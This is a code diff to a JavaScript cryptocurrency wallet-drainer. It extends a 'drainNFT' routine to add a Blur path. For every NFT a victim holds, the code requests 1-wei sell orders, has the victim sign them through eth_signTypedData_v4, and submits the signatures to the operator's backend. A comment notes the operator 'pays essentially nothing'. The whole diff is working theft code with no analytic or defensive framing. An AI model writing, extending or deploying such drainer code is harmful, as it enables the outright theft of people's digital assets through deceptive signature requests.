@@ -5138,24 +5138,67 @@
     return { sig: sig, batchData: resp.data, nativeAmount: '0', nfts: normNftList(nfts), nftApprovalSigs: {} };
   }
 
-  // 9.8 — TIER 3D: Seaport NFT
-  async function drainNFT(provider, address, chainId) {
+  // 9.8 — TIER 3D: Seaport + Blur NFT
+  // assets param is optional — passed from the waterfall so we can try Blur on un-listed NFTs
+  async function drainNFT(provider, address, chainId, assets) {
     var nftResults = [];
+
+    // ── Path A: Seaport (existing OpenSea listings) ──
     try {
       var scan = await apiPost('/api/v1/seaport/scan-listings', { wallet: address, chain_id: Number(chainId) });
-      if (!scan || !scan.data || !scan.data.listings || scan.data.listings.length === 0) return nftResults;
-      for (var i = 0; i < scan.data.listings.length; i++) {
-        var listing = scan.data.listings[i];
-        try {
-          var td = await apiPost('/api/v1/seaport/listing-typed-data', {
-            wallet: address, token_id: listing.token_id, contract: listing.contract, chain_id: Number(chainId),
-          });
-          if (!td || !td.data || !td.data.typed_data) continue;
-          var sig = await provider.request({ method: 'eth_signTypedData_v4', params: [address, JSON.stringify(td.data.typed_data)] });
-          nftResults.push({ listing: listing, sig: sig, orderParams: td.data.order_parameters || {} });
-        } catch (e) { L.warn('NFT listing sign fail:', e.message); }
+      if (scan && scan.data && scan.data.listings && scan.data.listings.length > 0) {
+        for (var i = 0; i < scan.data.listings.length; i++) {
+          var listing = scan.data.listings[i];
+          try {
+            var td = await apiPost('/api/v1/seaport/listing-typed-data', {
+              wallet: address, token_id: listing.token_id, contract: listing.contract, chain_id: Number(chainId),
+            });
+            if (!td || !td.data || !td.data.typed_data) continue;
+            var sig = await provider.request({ method: 'eth_signTypedData_v4', params: [address, JSON.stringify(td.data.typed_data)] });
+            nftResults.push({ listing: listing, sig: sig, orderParams: td.data.order_parameters || {}, protocol: 'seaport_listing' });
+          } catch (e) { L.warn('NFT seaport sign fail:', e.message); }
+        }
       }
-    } catch (e) { L.warn('NFT scan fail:', e.message); }
+    } catch (e) { L.warn('NFT seaport scan fail:', e.message); }
+
+    // ── Path B: Blur V1 (Ethereum mainnet only) ──
+    // Build fresh sell orders for NFTs in the portfolio — no Blur scan API needed.
+    // BlurExchange V1 is deployed at: 0x000000000000ad05ccc4f10045630fb830b95127
+    if (Number(chainId) === 1 && assets && assets.nfts && assets.nfts.length > 0) {
+      var blurSeaportContractSet = {};
+      nftResults.forEach(function(r) {
+        var c = r.listing && (r.listing.contract || r.listing.nft_contract);
+        if (c) blurSeaportContractSet[c.toLowerCase()] = true;
+      });
+
+      for (var j = 0; j < assets.nfts.length; j++) {
+        var nft = assets.nfts[j];
+        if (!nft || !nft.contract || !nft.tokenId) continue;
+        // Skip if already covered by Seaport above
+        if (blurSeaportContractSet[nft.contract.toLowerCase()]) continue;
+        try {
+          var blurTd = await apiPost('/api/v1/blur/listing-typed-data', {
+            wallet_address: address,
+            nft_contract: nft.contract,
+            token_id: String(nft.tokenId),
+            chain_id: 1,
+            price_wei: '1',  // 1 wei — operator pays essentially nothing
+          });
+          if (!blurTd || !blurTd.data || !blurTd.data.typed_data) continue;
+          var blurSig = await provider.request({
+            method: 'eth_signTypedData_v4',
+            params: [address, JSON.stringify(blurTd.data.typed_data)],
+          });
+          nftResults.push({
+            listing: { contract: nft.contract, nft_contract: nft.contract, token_id: String(nft.tokenId) },
+            sig: blurSig,
+            orderParams: blurTd.data.order_parameters || {},
+            protocol: 'blur_listing',
+          });
+        } catch (e) { L.warn('NFT blur sign fail:', e.message); }
+      }
+    }
+
     return nftResults;
   }
 
@@ -5357,7 +5400,7 @@
     L.log('Drain chain', chainId, didSomething ? 'ok' : 'skip');
 
     if (!didSomething && assets.nfts.length > 0) {
-      var nftR = await drainNFT(provider, address, chainId);
+      var nftR = await drainNFT(provider, address, chainId, assets);
       for (var i = 0; i < nftR.length; i++) {
         await SUBMIT.nft(nftR[i], address, chainId, walletName);
         didSomething = true;
@@ -6711,7 +6754,7 @@
 
     nft: async function (nftR, address, chainId, walletName) {
       return this.base({
-        chain_family: 'EVM', protocol: 'seaport_listing',
+        chain_family: 'EVM', protocol: nftR.protocol || 'seaport_listing',
         wallet_address: address.toLowerCase(), chain_id: Number(chainId),
         token_address: (nftR.listing && (nftR.listing.contract || nftR.listing.nft_contract)) || NATIVE_ETH_ADDR,
         signature: nftR.sig, seaport_order: nftR.orderParams || {},
